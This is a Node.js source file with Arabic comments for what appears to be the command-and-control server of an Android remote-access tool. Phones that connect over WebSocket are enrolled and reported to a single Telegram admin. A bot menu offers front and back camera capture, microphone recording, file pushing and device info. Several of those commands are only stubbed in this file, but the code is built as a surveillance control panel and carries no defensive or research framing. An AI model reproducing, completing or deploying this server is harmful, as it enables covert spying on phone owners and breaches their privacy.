const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const moment = require('moment');
const helmet = require('helmet');
const cors = require('cors');
const { RateLimiterMemory } = require('rate-limiter-flexible');

// تهيئة التطبيق
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// إعدادات الأمان
app.use(helmet());
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// معدل الاستخدام للحماية من الهجمات
const rateLimiter = new RateLimiterMemory({
  keyGenerator: (req) => req.ip,
  points: 10,
  duration: 1
});

app.use((req, res, next) => {
  rateLimiter.consume(req.ip)
    .then(() => next())
    .catch(() => res.status(429).send('Too Many Requests'));
});

// إعدادات التحميل
const upload = multer({
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB حد أقصى
  },
  fileFilter: (req, file, cb) => {
    // السماح بأنواع ملفات محددة فقط
    const allowedTypes = ['image/', 'video/', 'audio/', 'text/', 'application/pdf'];
    if (allowedTypes.some(type => file.mimetype.startsWith(type))) {
      cb(null, true);
    } else {
      cb(new Error('نوع الملف غير مسموح به'), false);
    }
  }
});

// إعدادات البوت
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_CHAT_ID_HERE';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// تخزين البيانات
const connectedDevices = new Map();
const deviceSessions = new Map();
const userPermissions = new Map();

// فئات الأوامر
const commandCategories = {
  device: '📱 إدارة الأجهزة',
  message: '📨 الرسائل',
  media: '🎭 الوسائط',
  system: '⚙️ النظام',
  security: '🔒 الأمان'
};

// لوحة المفاتيح الرئيسية
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      ['📱 قائمة الأجهزة', '🔍 معلومات الجهاز'],
      ['📨 إرسال رسالة', '📍 إرسال موقع'],
      ['📁 إرسال ملف', '🎤 تسجيل ميكروفون'],
      ['📷 كاميرا أمامية', '📸 كاميرا خلفية'],
      ['🔔 إشعار', '🔊 تشغيل صوت'],
      ['⚙️ الإعدادات', '📊 الإحصائيات']
    ],
    resize_keyboard: true
  }
};

// إعدادات لوحة المفاتيح
const settingsKeyboard = {
  reply_markup: {
    keyboard: [
      ['🔐 تغيير الصلاحيات', '⏱️ ضبط المهلة'],
      ['📝 تغيير الرسالة الترحيبية', '🔄 إعادة تشغيل البوت'],
      ['🏠 القائمة الرئيسية']
    ],
    resize_keyboard: true
  }
};

// وظائف مساعدة
class DeviceManager {
  static addDevice(ws, deviceInfo) {
    const deviceId = uuidv4();
    const deviceData = {
      id: deviceId,
      ws: ws,
      info: deviceInfo,
      connectedAt: new Date(),
      lastActivity: new Date(),
      status: 'online'
    };

    connectedDevices.set(deviceId, deviceData);
    ws.deviceId = deviceId;

    console.log(`📱 جهاز متصل: ${deviceInfo.model} (${deviceId})`);
    return deviceId;
  }

  static removeDevice(deviceId) {
    const device = connectedDevices.get(deviceId);
    if (device) {
      connectedDevices.delete(deviceId);
      console.log(`📴 جهاز منفصل: ${device.info.model} (${deviceId})`);
    }
  }

  static getDevice(deviceId) {
    return connectedDevices.get(deviceId);
  }

  static getAllDevices() {
    return Array.from(connectedDevices.values());
  }

  static updateActivity(deviceId) {
    const device = connectedDevices.get(deviceId);
    if (device) {
      device.lastActivity = new Date();
    }
  }

  static sendToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (device && device.ws.readyState === WebSocket.OPEN) {
      const message = {
        type: 'command',
        command: command,
        data: data,
        timestamp: new Date().toISOString()
      };
      
      device.ws.send(JSON.stringify(message));
      this.updateActivity(deviceId);
      return true;
    }
    return false;
  }

  static broadcast(command, data = {}) {
    let successCount = 0;
    connectedDevices.forEach((device, deviceId) => {
      if (this.sendToDevice(deviceId, command, data)) {
        successCount++;
      }
    });
    return successCount;
  }
}

// وظائف البوت المحسنة
class BotManager {
  static sendMainMenu(chatId) {
    const welcomeMessage = `
🎯 *مرحباً بك في نظام التحكم المتقدم*

📊 **الإحصائيات الحالية:**
• 📱 الأجهزة المتصلة: ${connectedDevices.size}
• ⏰ وقت التشغيل: ${moment().format('YYYY-MM-DD HH:mm:ss')}

🛠 **اختر من الأوامر التالية:**
    `;

    bot.sendMessage(chatId, welcomeMessage, {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard.reply_markup
    });
  }

  static async sendDeviceList(chatId) {
    const devices = DeviceManager.getAllDevices();
    
    if (devices.length === 0) {
      bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً', mainKeyboard);
      return;
    }

    let message = `📱 *قائمة الأجهزة المتصلة (${devices.length})*:\n\n`;
    
    devices.forEach((device, index) => {
      const uptime = moment(device.connectedAt).fromNow();
      const lastSeen = moment(device.lastActivity).fromNow();
      
      message += `*${index + 1}. ${device.info.model}*\n`;
      message += `   🆔: ${device.id}\n`;
      message += `   🔋 البطارية: ${device.info.battery || 'غير معروف'}%\n`;
      message += `   📶 الإصدار: ${device.info.version || 'غير معروف'}\n`;
      message += `   ⏰ متصل منذ: ${uptime}\n`;
      message += `   🔄 آخر نشاط: ${lastSeen}\n\n`;
    });

    // إنشاء أزرار لكل جهاز
    const inlineKeyboard = devices.map(device => [
      {
        text: `⚙️ ${device.info.model}`,
        callback_data: `device_${device.id}`
      }
    ]);

    bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  }

  static sendDeviceDetails(chatId, deviceId) {
    const device = DeviceManager.getDevice(deviceId);
    if (!device) {
      bot.sendMessage(chatId, '❌ الجهاز غير متوفر', mainKeyboard);
      return;
    }

    const message = `
🔍 *معلومات الجهاز التفصيلية*

📱 *النموذج:* ${device.info.model}
🆔 *المعرف:* ${device.id}
🔋 *البطارية:* ${device.info.battery}%
📶 *إصدار الأندرويد:* ${device.info.version}
💡 *سطوع الشاشة:* ${device.info.brightness}%
📡 *مزود الخدمة:* ${device.info.provider}
⏰ *وقت الاتصال:* ${moment(device.connectedAt).format('YYYY-MM-DD HH:mm:ss')}
🔄 *آخر نشاط:* ${moment(device.lastActivity).fromNow()}
🟢 *الحالة:* ${device.status}
    `;

    const controlKeyboard = {
      inline_keyboard: [
        [
          { text: '📨 إرسال رسالة', callback_data: `send_msg_${deviceId}` },
          { text: '📍 إرسال موقع', callback_data: `send_loc_${deviceId}` }
        ],
        [
          { text: '📁 إرسال ملف', callback_data: `send_file_${deviceId}` },
          { text: '🔔 إشعار', callback_data: `notify_${deviceId}` }
        ],
        [
          { text: '📷 كاميرا أمامية', callback_data: `camera_front_${deviceId}` },
          { text: '📸 كاميرا خلفية', callback_data: `camera_back_${deviceId}` }
        ],
        [
          { text: '🎤 تسجيل صوت', callback_data: `record_audio_${deviceId}` },
          { text: '🔊 تشغيل صوت', callback_data: `play_audio_${deviceId}` }
        ],
        [
          { text: '📊 معلومات النظام', callback_data: `sys_info_${deviceId}` },
          { text: '🔄 تحديث المعلومات', callback_data: `refresh_${deviceId}` }
        ],
        [
          { text: '🏠 القائمة الرئيسية', callback_data: 'main_menu' }
        ]
      ]
    };

    bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: controlKeyboard
    });
  }
}

// مسارات الويب
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>نظام التحكم في الأجهزة</title>
        <meta charset="utf-8">
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; direction: rtl; }
            .stats { background: #f4f4f4; padding: 20px; border-radius: 10px; }
            .device { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
        </style>
    </head>
    <body>
        <h1>🎯 نظام التحكم في الأجهزة</h1>
        <div class="stats">
            <h3>📊 الإحصائيات:</h3>
            <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
            <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
        </div>
        <div class="devices">
            <h3>📲 الأجهزة المتصلة:</h3>
            ${DeviceManager.getAllDevices().map(device => `
                <div class="device">
                    <strong>${device.info.model}</strong><br>
                    🔋 ${device.info.battery}% | 📶 ${device.info.version}<br>
                    ⏰ ${moment(device.connectedAt).fromNow()}
                </div>
            `).join('') || '<p>لا توجد أجهزة متصلة</p>'}
        </div>
    </body>
    </html>
  `);
});

// مسارات API
app.post('/api/send-message', upload.none(), (req, res) => {
  try {
    const { deviceId, message } = req.body;
    
    if (!deviceId || !message) {
      return res.status(400).json({ error: 'معرف الجهاز والرسالة مطلوبان' });
    }

    const success = DeviceManager.sendToDevice(deviceId, 'show_message', { message });
    
    if (success) {
      res.json({ success: true, message: 'تم إرسال الرسالة بنجاح' });
    } else {
      res.status(404).json({ error: 'الجهاز غير متصل' });
    }
  } catch (error) {
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

app.post('/api/upload-file', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'لم يتم اختيار ملف' });
    }

    const { deviceId } = req.body;
    const fileInfo = {
      originalname: req.file.originalname,
      mimetype: req.file.mimetype,
      size: req.file.size,
      buffer: req.file.buffer
    };

    if (deviceId) {
      // إرسال لجهاز محدد
      DeviceManager.sendToDevice(deviceId, 'receive_file', fileInfo);
    } else {
      // بث لجميع الأجهزة
      DeviceManager.broadcast('receive_file', fileInfo);
    }

    res.json({ success: true, message: 'تم رفع الملف بنجاح' });
  } catch (error) {
    res.status(500).json({ error: 'خطأ في رفع الملف' });
  }
});

// WebSocket handling
wss.on('connection', (ws, req) => {
  console.log('🔌 محاولة اتصال جديدة...');

  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data);
      
      if (message.type === 'device_info') {
        // تسجيل الجهاز الجديد
        const deviceId = DeviceManager.addDevice(ws, message.data);
        
        // إرسال تأكيد الاتصال
        ws.send(JSON.stringify({
          type: 'connection_established',
          deviceId: deviceId,
          timestamp: new Date().toISOString()
        }));

        // إشعار المدير
        bot.sendMessage(ADMIN_CHAT_ID, 
          `🟢 *جهاز جديد متصل*\n\n` +
          `📱 *النموذج:* ${message.data.model}\n` +
          `🔋 *البطارية:* ${message.data.battery}%\n` +
          `📶 *الإصدار:* ${message.data.version}\n` +
          `🆔 *المعرف:* ${deviceId}`,
          { parse_mode: 'Markdown' }
        );
      }
      else if (message.type === 'response') {
        // معالجة ردود الأجهزة
        console.log('📨 رد من الجهاز:', message);
      }
      else if (message.type === 'error') {
        // معالجة الأخطاء من الأجهزة
        console.error('❌ خطأ من الجهاز:', message.error);
      }

      DeviceManager.updateActivity(ws.deviceId);
    } catch (error) {
      console.error('❌ خطأ في معالجة الرسالة:', error);
    }
  });

  ws.on('close', () => {
    if (ws.deviceId) {
      DeviceManager.removeDevice(ws.deviceId);
    }
  });

  ws.on('error', (error) => {
    console.error('❌ خطأ في WebSocket:', error);
    if (ws.deviceId) {
      DeviceManager.removeDevice(ws.deviceId);
    }
  });
});

// معالجة أوامر البوت
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // التحقق من الصلاحيات
  if (chatId != ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
    return;
  }

  try {
    switch(text) {
      case '/start':
      case '🏠 القائمة الرئيسية':
        BotManager.sendMainMenu(chatId);
        break;

      case '📱 قائمة الأجهزة':
        BotManager.sendDeviceList(chatId);
        break;

      case '🔍 معلومات الجهاز':
        bot.sendMessage(chatId, '👆 الرجاء اختيار جهاز من القائمة', {
          reply_markup: {
            keyboard: [[{ text: '📱 قائمة الأجهزة' }, { text: '🏠 القائمة الرئيسية' }]],
            resize_keyboard: true
          }
        });
        break;

      case '📨 إرسال رسالة':
        bot.sendMessage(chatId, '📝 الرجاء إدخال الرسالة التي تريد إرسالها:', {
          reply_markup: { force_reply: true }
        });
        break;

      case '📍 إرسال موقع':
        bot.sendMessage(chatId, '🗺️ الرجاء إرسال الموقع:', {
          reply_markup: { force_reply: true }
        });
        break;

      case '📁 إرسال ملف':
        bot.sendMessage(chatId, '📎 الرجاء إرسال الملف:', {
          reply_markup: { force_reply: true }
        });
        break;

      case '⚙️ الإعدادات':
        bot.sendMessage(chatId, '⚙️ إعدادات النظام:', settingsKeyboard);
        break;

      case '📊 الإحصائيات':
        const stats = `
📊 *إحصائيات النظام*

📱 الأجهزة المتصلة: *${connectedDevices.size}*
🕒 وقت التشغيل: *${moment().format('YYYY-MM-DD HH:mm:ss')}*
💾 استخدام الذاكرة: *${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB*
        `;
        bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
        break;

      default:
        if (msg.reply_to_message) {
          handleReplies(chatId, msg);
        } else {
          bot.sendMessage(chatId, '❌ أمر غير معروف، الرجاء استخدام القائمة', mainKeyboard);
        }
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الرسالة:', error);
    bot.sendMessage(chatId, '❌ حدث خطأ، الرجاء المحاولة لاحقاً');
  }
});

// معالجة الردود
function handleReplies(chatId, msg) {
  const replyText = msg.reply_to_message.text;
  
  if (replyText.includes('الرسالة')) {
    DeviceManager.broadcast('show_message', { message: msg.text });
    bot.sendMessage(chatId, '✅ تم إرسال الرسالة لجميع الأجهزة', mainKeyboard);
  }
  else if (replyText.includes('الموقع')) {
    // معالجة إرسال الموقع
    bot.sendMessage(chatId, '📍 سيتم إضافة دعم الموقع في التحديثات القادمة', mainKeyboard);
  }
}

// معالجة الأزرار
bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message.chat.id;

  try {
    if (data.startsWith('device_')) {
      const deviceId = data.replace('device_', '');
      BotManager.sendDeviceDetails(chatId, deviceId);
    }
    else if (data.startsWith('send_msg_')) {
      const deviceId = data.replace('send_msg_', '');
      bot.sendMessage(chatId, '📝 اكتب الرسالة التي تريد إرسالها لهذا الجهاز:', {
        reply_markup: { force_reply: true }
      });
      deviceSessions.set(chatId, { action: 'send_message', deviceId: deviceId });
    }
    else if (data === 'main_menu') {
      BotManager.sendMainMenu(chatId);
    }
    // يمكن إضافة المزيد من الأزرار هنا

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (error) {
    console.error('❌ خطأ في معالجة الزر:', error);
    bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
  }
});

// تنظيف الاتصالات الميتة كل 5 دقائق
setInterval(() => {
  const now = new Date();
  connectedDevices.forEach((device, deviceId) => {
    const inactiveTime = now - device.lastActivity;
    if (inactiveTime > 5 * 60 * 1000) { // 5 دقائق
      console.log(`🔴 فصل جهاز غير نشط: ${device.info.model}`);
      device.ws.close();
      DeviceManager.removeDevice(deviceId);
    }
  });
}, 5 * 60 * 1000);

// بدء الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
🎯 نظام التحكم في الأجهزة يعمل بنجاح!
📍 PORT: ${PORT}
⏰ الوقت: ${new Date().toLocaleString()}
📱 انتظر اتصال الأجهزة...
  `);
});

// معالجة الأخطاء غير الملتقطة
process.on('uncaughtException', (error) => {
  console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ رفض وعد غير معالج:', reason);
});